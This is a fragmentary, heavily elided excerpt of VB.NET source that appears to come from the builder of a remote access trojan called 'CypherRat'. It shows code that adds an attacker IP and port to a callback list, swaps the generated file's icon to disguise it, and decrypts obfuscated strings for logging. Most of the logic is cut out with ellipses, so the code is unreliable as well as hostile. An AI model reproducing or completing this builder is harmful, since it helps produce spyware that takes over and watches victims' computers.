...
Public Class Build
    ...
    Private Sub StartWork(final As String)
        ...
        If Not arguments = Nothing Then
            ...
            LOG(Decrypt("Q2XJfkb/FDYyn6oQAan0AoieKOTccLOjmNDp0sxYfEc=", "42366745674"))
            LOG(Decrypt("c0a12L4SpB9aSuciSToKSR6iLl36zEAdozp+ypa7zB0=", "ergsaerhhethrthb"))
            LOG(Decrypt("H3kPQPrr5l67ij4IrYdlSA==", "f3qg445hw4hb"))
...
Back0:
        ...
        folder_building = driv & "CypherRat35_Bilder"
...
SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B)
    ...
    Private Sub DrakeUIAvatar1_Click(sender As Object, e As EventArgs) Handles DrakeUIAvatar1.Click
        DGV0.Rows.Add(TextIP.Text & ":" & po.Value)

    End Sub

    Private Sub DrakeUIAvatar2_Click(sender As Object, e As EventArgs) Handles DrakeUIAvatar2.Click
            ...
            If CheckIconPatch.Checked = True Then
                ...
                Select Case openFD.ShowDialog()
                    ...
                    Case DialogResult.OK
                        ...
                        PictureBox1.Image = ResizeImage(Image.FromFile(openFD.FileName), New Size(144, 144))
                    Case Else
